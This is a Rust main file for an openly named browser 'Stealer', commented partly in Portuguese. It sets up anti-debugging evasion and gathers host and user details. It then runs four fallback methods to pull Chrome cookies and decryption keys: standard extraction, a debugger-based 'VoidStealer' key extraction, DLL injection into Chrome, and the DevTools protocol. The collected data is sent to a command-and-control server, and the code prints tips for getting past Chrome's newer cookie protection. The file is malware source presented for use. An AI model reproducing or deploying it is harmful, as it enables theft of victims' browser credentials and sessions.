// #![windows_subsystem = "windows"]

mod evasion;
mod crypto;
mod exfil;
mod browser;
mod injection;
mod debugger;  // NOVO - Técnica VoidStealer

use std::thread;
use std::time::Duration;
use std::panic;

fn main() {
    println!("[!] Stealer started");
    
    panic::set_hook(Box::new(|_| {}));
    
    if evasion::is_debugged() {
        println!("[!] Debug detected, exiting");
        return;
    }
    
    thread::sleep(Duration::from_secs(2));
    
    let machine_name = std::env::var("COMPUTERNAME").unwrap_or_else(|_| "UNKNOWN".to_string());
    let username = std::env::var("USERNAME").unwrap_or_else(|_| "UNKNOWN".to_string());
    let ip_address = exfil::get_local_ip().unwrap_or_else(|| "0.0.0.0".to_string());
    
    println!("[!] Machine: {}, User: {}, IP: {}", machine_name, username, ip_address);
    
    let mut browser_data = String::new();
    
    // ============================================================
    // 🔥 ESTRATÉGIA 1: Tentativa normal (v10/v11 - dados antigos)
    // ============================================================
    println!("[!] [1/4] Attempting standard extraction (v10/v11)...");
    browser_data = browser::get_cookies_as_text(&username);
    
    // ============================================================
    // 🔥 ESTRATÉGIA 2: VoidStealer (Hardware Breakpoint + Debugger)
    // ============================================================
    if browser_data.is_empty() {
        println!("[!] [2/4] Standard extraction failed, trying VoidStealer technique...");
        match debugger::extract_key_via_debugger() {
            Ok(key) => {
                println!("[!] VoidStealer extracted master key: {} bytes", key.len());
                // Usar a chave extraída para descriptografar os dados
                if let Ok(data) = browser::get_cookies_with_key(&username, &key) {
                    browser_data = data;
                    println!("[!] VoidStealer successfully decrypted browser data!");
                }
            }
            Err(e) => println!("[!] VoidStealer failed: {}", e),
        }
    }
    
    // ============================================================
    // 🔥 ESTRATÉGIA 3: Injeção de DLL + COM Elevator
    // ============================================================
    if browser_data.is_empty() {
        println!("[!] [3/4] VoidStealer failed, trying DLL injection...");
        if let Some(pid) = injection::find_chrome_process() {
            println!("[!] Found Chrome PID: {}", pid);
            
            // Tenta extrair via debugging no processo existente
            if let Ok(key) = injection::extract_key_via_debugging(pid) {
                println!("[!] Extracted key via debugging: {} bytes", key.len());
                if let Ok(data) = browser::get_cookies_with_key(&username, &key) {
                    browser_data = data;
                    println!("[!] DLL injection successfully decrypted browser data!");
                }
            }
        } else {
            // Se não encontrar Chrome rodando, cria um novo
            println!("[!] Chrome not running, creating suspended process...");
            if let Ok(key) = injection::inject_into_suspended_chrome("payload.dll") {
                println!("[!] Suspended injection extracted key: {} bytes", key.len());
            }
        }
    }
    
    // ============================================================
    // 🔥 ESTRATÉGIA 4: DevTools Protocol (último recurso)
    // ============================================================
    if browser_data.is_empty() {
        println!("[!] [4/4] DLL injection failed, trying DevTools method...");
        if let Ok(cookies_json) = injection::extract_via_devtools() {
            browser_data = cookies_json;
            println!("[!] DevTools successfully extracted browser data!");
        }
    }
    
    // ============================================================
    // ENVIO DOS DADOS PARA O C2
    // ============================================================
    if !browser_data.is_empty() {
        println!("[!] Total browser data collected: {} bytes", browser_data.len());
        
        match exfil::send_to_c2(&browser_data, &machine_name, &username, &ip_address) {
            Ok(_) => println!("[!] Browser data sent successfully ({} bytes)", browser_data.len()),
            Err(e) => println!("[!] Send failed: {}", e),
        }
    } else {
        println!("[!] ⚠️ CRITICAL: No browser data extracted!");
        println!("[!] Chrome v20+ protection is active.");
        println!("[!] Suggestions:");
        println!("[!]   - Run Chrome with --remote-debugging-port=9222");
        println!("[!]   - Ensure you have administrator privileges for registry downgrade");
        println!("[!]   - Check if Chrome version is supported");
    }
    
    println!("[!] Stealer finished");
    std::process::exit(0);
}